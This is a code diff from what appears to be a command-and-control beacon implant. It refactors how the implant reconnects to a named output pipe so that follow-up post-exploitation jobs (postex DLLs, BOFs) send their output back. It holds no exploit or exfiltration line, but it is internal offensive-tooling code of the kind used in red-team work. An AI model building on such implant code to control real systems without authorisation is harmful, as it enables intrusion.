@@ -547,6 +547,31 @@ void command_job_kill(char * buffer, int length) {
  *
  * The postex DLL on the other end picks the data up through the kit's
  * BeaconInputAvailable()/BeaconInputRead() (or our test DLL's equivalent). */
+/* C-36: the kit DLL's bg loop spawns a follow-up job whose runner
+ * creates a NEW instance of the output pipe and blocks in
+ * ConnectNamedPipe until the beacon connects again.  The output pipe
+ * name rides in the tracked description ("postex_ctrl|<outname>",
+ * captured at spawn time from the postex args blob).  Reconnect and
+ * track it as a fresh message-mode job so the follow-up BOF runs and
+ * its chunks flow back through the normal psh_poll read loop. */
+static void kit_reconnect_out(psh_entry * ctrl) {
+	char * outname = strstr(ctrl->description, "|");
+	HANDLE out_h = INVALID_HANDLE_VALUE;
+	int x;
+	if (outname == NULL) {
+		return;
+	}
+	outname++;
+	for (x = 0; x < 20; x++) {
+		if (connect_pipe(outname, &out_h)) {
+			pipe_track(out_h, ctrl->pid, CALLBACK_OUTPUT,
+			           "postex_out", JOB_MODE_MESSAGE);
+			return;
+		}
+		Sleep(500);
+	}
+}
+
 void command_job_data(char * buffer, int length) {
 	datap       parser;
 	psh_entry * temp = psh_list;
@@ -570,6 +595,9 @@ void command_job_data(char * buffer, int length) {
 			if (!WriteFile(temp->read_stdout, data, dlen, &written, NULL)) {
 				post_error_d(0x55, GetLastError());
 			}
+			else if (strstr(temp->description, "postex_ctrl") != NULL) {
+				kit_reconnect_out(temp);
+			}
 			return;
 		}
 		temp = (psh_entry*)temp->next;
@@ -586,28 +614,7 @@ void command_job_data(char * buffer, int length) {
 				post_error_d(0x55, GetLastError());
 			}
 			else {
-				/* C-36: the follow-up frame makes the kit's bg loop spawn a
-				 * new job whose runner creates a NEW instance of the output
-				 * pipe and blocks in ConnectNamedPipe until we connect again.
-				 * The output pipe name rides in the tracked description
-				 * ("postex_ctrl|<outname>", captured at spawn time from the
-				 * postex args blob).  Reconnect and track it as a fresh
-				 * message-mode job so the follow-up BOF runs and its chunks
-				 * flow back through the normal psh_poll read loop. */
-				char * outname = strstr(temp->description, "|");
-				if (outname != NULL) {
-					HANDLE out_h = INVALID_HANDLE_VALUE;
-					int x;
-					outname++;
-					for (x = 0; x < 20; x++) {
-						if (connect_pipe(outname, &out_h)) {
-							pipe_track(out_h, temp->pid, CALLBACK_OUTPUT,
-							           "postex_out", JOB_MODE_MESSAGE);
-							break;
-						}
-						Sleep(500);
-					}
-				}
+				kit_reconnect_out(temp);
 			}
 			return;
 		}
